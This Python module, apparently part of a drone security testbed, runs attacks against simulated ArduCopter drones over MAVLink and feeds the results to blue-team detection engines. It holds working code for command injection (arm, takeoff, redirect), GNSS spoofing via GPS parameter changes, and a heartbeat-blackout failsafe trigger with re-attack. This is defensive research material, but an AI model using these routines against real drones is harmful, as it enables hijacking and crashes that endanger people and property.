"""공격 실행 엔진 — FastAPI 백엔드에서 비동기로 호출."""
from __future__ import annotations

import asyncio
import datetime
import logging
import math
import os
import threading
import time
from typing import Any, Callable, Coroutine

from app.blue_agent.ai.analyzer import threat_analyzer
from app.blue_agent.event.engine import event_engine
from app.blue_agent.response.engine import response_engine
from app.blue_agent.risk.engine import risk_engine

log = logging.getLogger(__name__)

SITL_HOST    = os.environ.get("SITL_HOST", "127.0.0.1")
ATTACK_PORTS = {"drone-01": 25760, "drone-02": 25770, "drone-03": 25780}
HOME_LAT     = 37.566535
HOME_LON     = 126.977969

COPTER_MODES = {0: "STABILIZE", 3: "AUTO", 4: "GUIDED", 5: "LOITER", 6: "RTL", 9: "LAND"}
ACK_RESULTS  = {0: "ACCEPTED", 1: "TEMP_REJECTED", 2: "DENIED",
                3: "UNSUPPORTED", 4: "FAILED", 5: "IN_PROGRESS"}

BroadcastFn = Callable[[dict], Coroutine]


class AttackRunner:
    def __init__(self) -> None:
        self._tasks:    dict[str, asyncio.Task]       = {}
        self._stop_evs: dict[str, threading.Event]    = {}
        self._broadcast: BroadcastFn | None           = None

    def set_broadcast(self, fn: BroadcastFn) -> None:
        self._broadcast = fn

    async def emit(self, attack_id: str, drone_id: str, stage: str,
                   detail: str, evidence: dict | None = None) -> None:
        event = event_engine.ingest_attack(drone_id, attack_id, evidence or {})
        threat_analyzer.note_event(event)
        assessment = risk_engine.process_event(event)
        if assessment is not None:
            response_engine.on_assessment(assessment)
            analysis = threat_analyzer.on_assessment(assessment)
            if analysis is not None:
                log.warning("AI 위협 분석 (%s): %s", assessment.level, analysis)
        if self._broadcast:
            await self._broadcast({
                "type":      "attack_event",
                "attack_id": attack_id,
                "drone_id":  drone_id,
                "stage":     stage,
                "detail":    detail,
                "evidence":  evidence or {},
                "ts":        time.time(),
            })

    def is_running(self, attack_id: str) -> bool:
        t = self._tasks.get(attack_id)
        return t is not None and not t.done()

    def start(self, attack_id: str, coro: Coroutine) -> bool:
        if self.is_running(attack_id):
            return False
        task = asyncio.create_task(coro)
        self._tasks[attack_id] = task
        return True

    def stop(self, attack_id: str) -> bool:
        ev = self._stop_evs.pop(attack_id, None)
        if ev:
            ev.set()
        t = self._tasks.get(attack_id)
        if t and not t.done():
            t.cancel()
            return True
        return False

    def register_stop(self, attack_id: str, ev: threading.Event) -> None:
        self._stop_evs[attack_id] = ev

    def status(self) -> dict[str, bool]:
        return {k: not t.done() for k, t in self._tasks.items()}


attack_runner = AttackRunner()


# ── 공통 유틸 ──────────────────────────────────────────────────────────────────

def _connect(drone_id: str):
    from pymavlink import mavutil
    port = ATTACK_PORTS[drone_id]
    conn = mavutil.mavlink_connection(f"tcp:{SITL_HOST}:{port}", source_system=255)
    hb = conn.wait_heartbeat(timeout=10)
    if hb is None:
        raise TimeoutError("HEARTBEAT 타임아웃 — SITL 미실행 또는 포트 불일치")
    conn.target_component = 1
    return conn, hb


def _gps_week_ms() -> tuple[int, int]:
    GPS_EPOCH = datetime.datetime(1980, 1, 6, tzinfo=datetime.timezone.utc)
    now   = datetime.datetime.now(datetime.timezone.utc)
    delta = now - GPS_EPOCH
    week     = delta.days // 7
    week_ms  = int((delta.total_seconds() % (7 * 86400)) * 1000)
    return week, week_ms


# ── ATT-01: MAVLink 명령 주입 ──────────────────────────────────────────────────

async def run_inject(drone_id: str, cmd: str, params: dict) -> None:
    attack_id = f"att01_{drone_id}"
    runner    = attack_runner
    loop      = asyncio.get_event_loop()

    await runner.emit(attack_id, drone_id, "start",
                      f"MAVLink 명령 주입: {cmd}", {"cmd": cmd})

    def _blocking() -> dict:
        try:
            conn, hb = _connect(drone_id)
        except Exception as e:
            return {"success": False, "error": str(e)}

        ts           = conn.target_system
        armed_before = bool(hb.base_mode & 0x80)
        mode_before  = COPTER_MODES.get(hb.custom_mode, f"MODE_{hb.custom_mode}")
        hex_sent     = ""

        if cmd == "ARM":
            msg_obj = conn.mav.command_long_encode(ts, 1, 400, 0, 1.0, 21196.0, 0, 0, 0, 0, 0)
            raw = msg_obj.pack(conn.mav); conn.write(raw)
            hex_sent = raw.hex()
        elif cmd == "DISARM":
            msg_obj = conn.mav.command_long_encode(ts, 1, 400, 0, 0.0, 21196.0, 0, 0, 0, 0, 0)
            raw = msg_obj.pack(conn.mav); conn.write(raw)
            hex_sent = raw.hex()
        elif cmd == "TAKEOFF":
            alt = float(params.get("alt", 30))
            conn.mav.set_mode_send(ts, 1, 4)  # GUIDED 선행 필수
            # GUIDED 전환 확인 후 TAKEOFF (최대 3초 대기)
            guided_ok = False
            dl_guided = time.time() + 3.0
            while time.time() < dl_guided:
                hb_tmp = conn.recv_match(type="HEARTBEAT", blocking=True, timeout=0.5)
                if hb_tmp and COPTER_MODES.get(hb_tmp.custom_mode) == "GUIDED":
                    guided_ok = True
                    break
            if not guided_ok:
                time.sleep(0.5)  # 확인 안 돼도 그냥 시도
            msg_obj = conn.mav.command_long_encode(ts, 1, 22, 0, 0, 0, 0, 0, 0, 0, alt)
            raw = msg_obj.pack(conn.mav); conn.write(raw)
            hex_sent = raw.hex()
        elif cmd == "GUIDED":
            msg_obj = conn.mav.set_mode_encode(ts, 1, 4)
            raw = msg_obj.pack(conn.mav); conn.write(raw)
            hex_sent = raw.hex()
        elif cmd == "RTL":
            msg_obj = conn.mav.set_mode_encode(ts, 1, 6)
            raw = msg_obj.pack(conn.mav); conn.write(raw)
            hex_sent = raw.hex()
        elif cmd == "SEQUENCE":
            alt = float(params.get("alt", 30))
            lat = float(params.get("lat", HOME_LAT + 0.009))
            lon = float(params.get("lon", HOME_LON))
            conn.mav.set_mode_send(ts, 1, 4)
            time.sleep(1)
            arm_obj = conn.mav.command_long_encode(ts, 1, 400, 0, 1.0, 21196.0, 0, 0, 0, 0, 0)
            arm_raw = arm_obj.pack(conn.mav); conn.write(arm_raw)
            time.sleep(2)
            tkoff_obj = conn.mav.command_long_encode(ts, 1, 22, 0, 0, 0, 0, 0, 0, 0, alt)
            tkoff_raw = tkoff_obj.pack(conn.mav); conn.write(tkoff_raw)
            time.sleep(5)
            conn.mav.set_position_target_global_int_send(
                0, ts, 1, 6, 0b0000111111111000,
                int(lat * 1e7), int(lon * 1e7), alt,
                0, 0, 0, 0, 0, 0, 0, 0,
            )
            hex_sent = arm_raw.hex()  # ARM 패킷 (핵심 주입 패킷)
        else:
            conn.close()
            return {"success": False, "error": f"Unknown cmd: {cmd}"}

        asyncio.run_coroutine_threadsafe(
            runner.emit(attack_id, drone_id, "progress",
                        f"패킷 전송: {hex_sent}", {"hex_sent": hex_sent}),
            loop,
        )

        ack_result = None
        deadline   = time.time() + 5.0
        while time.time() < deadline:
            msg = conn.recv_match(type="COMMAND_ACK", blocking=True, timeout=0.5)
            if msg:
                ack_result = msg.result
                break

        # 모드/무장 상태 변화가 실제로 반영될 때까지 최대 6초 대기
        armed_after  = armed_before
        mode_after   = mode_before
        hb_deadline  = time.time() + 6.0
        while time.time() < hb_deadline:
            hb2 = conn.recv_match(type="HEARTBEAT", blocking=True, timeout=0.5)
            if hb2 is None:
                continue
            armed_after = bool(hb2.base_mode & 0x80)
            mode_after  = COPTER_MODES.get(hb2.custom_mode, f"MODE_{hb2.custom_mode}")
            # 상태 변화가 확인되면 즉시 종료
            if cmd == "ARM"    and armed_after:             break
            if cmd == "DISARM" and not armed_after:          break
            if cmd == "GUIDED" and mode_after == "GUIDED":   break
            if cmd == "RTL"    and mode_after == "RTL":      break
            if cmd in ("TAKEOFF", "SEQUENCE"):               break

        conn.close()
        ack_str = ACK_RESULTS.get(ack_result, "TIMEOUT") if ack_result is not None else "TIMEOUT"
        if cmd == "GUIDED":
            success = mode_after == "GUIDED"
        elif cmd == "RTL":
            success = mode_after == "RTL"
        elif cmd == "SEQUENCE":
            success = armed_after
        else:
            success = ack_result == 0
        return {
            "success":      success,
            "cmd":          cmd,
            "hex_sent":     hex_sent,
            "ack_result":   ack_str,
            "ack_code":     ack_result,
            "armed_before": armed_before,
            "armed_after":  armed_after,
            "mode_before":  mode_before,
            "mode_after":   mode_after,
        }

    try:
        result = await asyncio.to_thread(_blocking)
        success = result.get("success", False)
        await runner.emit(
            attack_id, drone_id,
            "success" if success else "fail",
            f"ACK: {result.get('ack_result')} | armed: {result.get('armed_before')} → {result.get('armed_after')}",
            evidence=result,
        )
    except asyncio.CancelledError:
        await runner.emit(attack_id, drone_id, "stop", "중단됨")
    except Exception as e:
        await runner.emit(attack_id, drone_id, "fail", str(e))


# ── ATT-02: GNSS 스푸핑 ───────────────────────────────────────────────────────

async def run_gnss_spoof(drone_id: str, duration: int = 60,
                         step_m: float = 1.0, max_m: float = 200.0) -> None:
    attack_id = f"att02_{drone_id}"
    runner    = attack_runner
    loop      = asyncio.get_event_loop()
    stop_ev   = threading.Event()
    runner.register_stop(attack_id, stop_ev)

    await runner.emit(attack_id, drone_id, "start",
                      f"GNSS 스푸핑 — {step_m}m/주입 최대{max_m}m {duration}s")

    def _blocking() -> dict:
        from pymavlink import mavutil
        try:
            conn, _ = _connect(drone_id)
        except Exception as e:
            return {"success": False, "error": str(e)}

        ts = conn.target_system
        param_name = None
        for pname in ("GPS1_TYPE", "GPS_TYPE"):
            enc = pname.encode().ljust(16, b"\x00")[:16]
            conn.mav.param_request_read_send(ts, 1, enc, -1)
            pm = conn.recv_match(type="PARAM_VALUE", blocking=True, timeout=5)
            if pm is not None:
                conn.mav.param_set_send(ts, 1, enc, 14.0,
                                        mavutil.mavlink.MAV_PARAM_TYPE_INT8)
                ack = conn.recv_match(type="PARAM_VALUE", blocking=True, timeout=5)
                if ack and abs(ack.param_value - 14.0) < 0.5:
                    param_name = pname
                break

        time.sleep(2)

        base_lat, base_lon, base_alt = HOME_LAT, HOME_LON, 0.0
        dl = time.time() + 5
        while time.time() < dl:
            msg = conn.recv_match(type="GLOBAL_POSITION_INT", blocking=True, timeout=1)
            if msg:
                base_lat = msg.lat / 1e7
                base_lon = msg.lon / 1e7
                base_alt = msg.alt / 1000.0
                break

        step_deg  = step_m / 111320
        max_deg   = max_m  / 111320
        off_lat   = 0.0
        off_lon   = 0.0
        count     = 0
        ekf_flag  = False
        end_time  = time.time() + duration
        last_emit = time.time()

        while not stop_ev.is_set() and time.time() < end_time:
            if abs(off_lat) < max_deg:
                off_lat += step_deg
            if abs(off_lon) < max_deg:
                off_lon += step_deg

            spoof_lat = base_lat + off_lat
            spoof_lon = base_lon + off_lon
            week, wms = _gps_week_ms()

            conn.mav.gps_input_send(
                int(time.time() * 1e6), 0, 0,
                wms, week, 3,
                int(spoof_lat * 1e7), int(spoof_lon * 1e7), base_alt,
                0.5, 0.5, 0.0, 0.0, 0.0, 0.2, 0.5, 0.5, 8,
            )
            count += 1

            # 수신 버퍼에 쌓인 모든 패킷을 드레인해 EKF 상태 캡처
            while True:
                msg = conn.recv_match(blocking=False)
                if msg is None:
                    break
                if msg.get_type() == "EKF_STATUS_REPORT" and (msg.flags & 0x80):
                    ekf_flag = True

            now = time.time()
            if now - last_emit >= 3:
                last_emit  = now
                drift_m    = math.sqrt(off_lat**2 + off_lon**2) * 111320
                asyncio.run_coroutine_threadsafe(
                    runner.emit(attack_id, drone_id, "progress",
                                f"주입 {count}회 | 오프셋 {drift_m:.1f}m | EKF 0x80={'✔' if ekf_flag else '✗'}",
                                {"inject_count": count, "offset_m": drift_m,
                                 "spoof_lat": spoof_lat, "spoof_lon": spoof_lon,
                                 "base_lat": base_lat, "base_lon": base_lon,
                                 "ekf_alarm": ekf_flag}),
                    loop,
                )

            stop_ev.wait(0.1)

        if param_name:
            enc = param_name.encode().ljust(16, b"\x00")[:16]
            conn.mav.param_set_send(ts, 1, enc, 1.0,
                                    mavutil.mavlink.MAV_PARAM_TYPE_INT8)
            conn.recv_match(type="PARAM_VALUE", blocking=True, timeout=3)
        conn.close()

        final_drift_m = math.sqrt(off_lat**2 + off_lon**2) * 111320
        return {
            "success":        count > 0 and final_drift_m > 5,
            "inject_count":   count,
            "final_offset_m": final_drift_m,
            "spoof_lat":      base_lat + off_lat,
            "spoof_lon":      base_lon + off_lon,
            "base_lat":       base_lat,
            "base_lon":       base_lon,
            "ekf_alarm":      ekf_flag,
        }

    try:
        result = await asyncio.to_thread(_blocking)
        success = result.get("success", False)
        await runner.emit(
            attack_id, drone_id,
            "success" if success else "fail",
            f"주입 {result.get('inject_count')}회 | 오프셋 {result.get('final_offset_m', 0):.1f}m | EKF={'✔' if result.get('ekf_alarm') else '✗'}",
            evidence=result,
        )
    except asyncio.CancelledError:
        stop_ev.set()
        await runner.emit(attack_id, drone_id, "stop", "GNSS 스푸핑 중단")
    except Exception as e:
        await runner.emit(attack_id, drone_id, "fail", str(e))


# ── ATT-03: 통신 두절 ────────────────────────────────────────────────────────

async def run_blackout(drone_id: str, warmup: int = 10, watch: int = 30,
                       do_reattack: bool = False) -> None:
    attack_id = f"att03_{drone_id}"
    runner    = attack_runner
    loop      = asyncio.get_event_loop()
    stop_ev   = threading.Event()
    runner.register_stop(attack_id, stop_ev)

    await runner.emit(attack_id, drone_id, "start",
                      f"통신 두절 — 워밍업 {warmup}s, 감시 {watch}s")

    def _blocking() -> dict:
        from pymavlink import mavutil
        try:
            conn, hb = _connect(drone_id)
        except Exception as e:
            return {"success": False, "error": str(e)}

        ts          = conn.target_system
        mode_before = COPTER_MODES.get(hb.custom_mode, str(hb.custom_mode))
        armed       = bool(hb.base_mode & 0x80)

        conn.mav.param_request_read_send(ts, 1, b"FS_GCS_ENABLE", -1)
        pm = conn.recv_match(type="PARAM_VALUE", blocking=True, timeout=5)
        if pm and int(pm.param_value) != 1:
            conn.mav.param_set_send(ts, 1, b"FS_GCS_ENABLE", 1.0,
                                    mavutil.mavlink.MAV_PARAM_TYPE_INT8)
            conn.recv_match(type="PARAM_VALUE", blocking=True, timeout=5)

        stop_hb    = threading.Event()
        hb_count   = [0]
        gcs_hb_hex = [""]  # 첫 번째 전송 패킷 hex 캡처

        def _hb_loop():
            first = True
            while not stop_hb.is_set():
                hb_obj = conn.mav.heartbeat_encode(
                    mavutil.mavlink.MAV_TYPE_GCS,
                    mavutil.mavlink.MAV_AUTOPILOT_INVALID,
                    0, 0, mavutil.mavlink.MAV_STATE_ACTIVE,
                )
                hb_raw = hb_obj.pack(conn.mav)
                conn.write(hb_raw)
                if first:
                    gcs_hb_hex[0] = hb_raw.hex()
                    first = False
                hb_count[0] += 1
                if hb_count[0] % 5 == 0:
                    asyncio.run_coroutine_threadsafe(
                        runner.emit(attack_id, drone_id, "progress",
                                    f"워밍업 {hb_count[0]}회 HEARTBEAT 전송"),
                        loop,
                    )
                stop_hb.wait(1.0)

        hb_thread = threading.Thread(target=_hb_loop, daemon=True)
        hb_thread.start()
        stop_ev.wait(warmup)

        if stop_ev.is_set():
            stop_hb.set()
            conn.close()
            return {"success": False, "error": "중단됨"}

        stop_hb.set()
        hb_thread.join()  # timeout 없이 완전 종료 확인 후 모니터 시작
        blackout_t = time.time()

        asyncio.run_coroutine_threadsafe(
            runner.emit(attack_id, drone_id, "progress",
                        f"★ HEARTBEAT 차단 ({hb_count[0]}회 전송 후) — Failsafe 대기",
                        {"mode_before": mode_before, "armed": armed,
                         "hb_sent": hb_count[0]}),
            loop,
        )

        cur_mode    = mode_before
        rtl_elapsed = None
        mode_after  = mode_before
        rtl_hb_hex  = [""]  # RTL 전환 시점의 드론 HEARTBEAT hex
        deadline    = time.time() + watch
        reattacked  = False

        while time.time() < deadline and not stop_ev.is_set():
            msg = conn.recv_match(blocking=True, timeout=0.5)
            if not msg:
                continue
            if msg.get_type() == "HEARTBEAT":
                mn = COPTER_MODES.get(msg.custom_mode, str(msg.custom_mode))
                if mn != cur_mode:
                    if mn == "RTL" and rtl_elapsed is None:
                        rtl_elapsed = time.time() - blackout_t
                        mode_after  = "RTL"
                        # 수신된 드론 HEARTBEAT bytes 캡처 (pymavlink _msgbuf 또는 재구성)
                        raw_buf = getattr(msg, '_msgbuf', None)
                        if raw_buf:
                            rtl_hb_hex[0] = bytes(raw_buf).hex()
                        else:
                            recon = conn.mav.heartbeat_encode(
                                msg.type, msg.autopilot,
                                msg.base_mode, msg.custom_mode, msg.system_status,
                            )
                            rtl_hb_hex[0] = recon.pack(conn.mav).hex()
                        asyncio.run_coroutine_threadsafe(
                            runner.emit(attack_id, drone_id, "progress",
                                        f"★ Failsafe RTL 발동! 차단 후 {rtl_elapsed:.1f}초",
                                        {"mode_before": mode_before, "mode_after": "RTL",
                                         "rtl_elapsed_s": rtl_elapsed}),
                            loop,
                        )
                        if do_reattack:
                            time.sleep(2)
                            lat_t = int((HOME_LAT + 0.009) * 1e7)
                            lon_t = int(HOME_LON * 1e7)
                            conn.mav.set_mode_send(ts, 1, 4)
                            time.sleep(0.5)
                            conn.mav.set_position_target_global_int_send(
                                0, ts, 1, 6, 0b0000111111111000,
                                lat_t, lon_t, 30.0, 0, 0, 0, 0, 0, 0, 0, 0,
                            )
                            reattacked = True
                    cur_mode = mn

        conn.close()
        return {
            "success":       rtl_elapsed is not None,
            "mode_before":   mode_before,
            "mode_after":    mode_after,
            "rtl_elapsed_s": rtl_elapsed,
            "hb_sent":       hb_count[0],
            "gcs_hb_hex":    gcs_hb_hex[0],
            "rtl_hb_hex":    rtl_hb_hex[0],
            "reattacked":    reattacked,
        }

    try:
        result = await asyncio.to_thread(_blocking)
        success = result.get("success", False)
        rtl_s   = result.get("rtl_elapsed_s")
        detail  = (f"모드: {result.get('mode_before')} → {result.get('mode_after')} | RTL {rtl_s:.1f}s 후"
                   if success else "RTL 전환 미발생 (Disarmed 상태이거나 FS_GCS_ENABLE=0)")
        await runner.emit(attack_id, drone_id,
                          "success" if success else "fail",
                          detail, evidence=result)
    except asyncio.CancelledError:
        stop_ev.set()
        await runner.emit(attack_id, drone_id, "stop", "통신 두절 공격 중단")
    except Exception as e:
        await runner.emit(attack_id, drone_id, "fail", str(e))
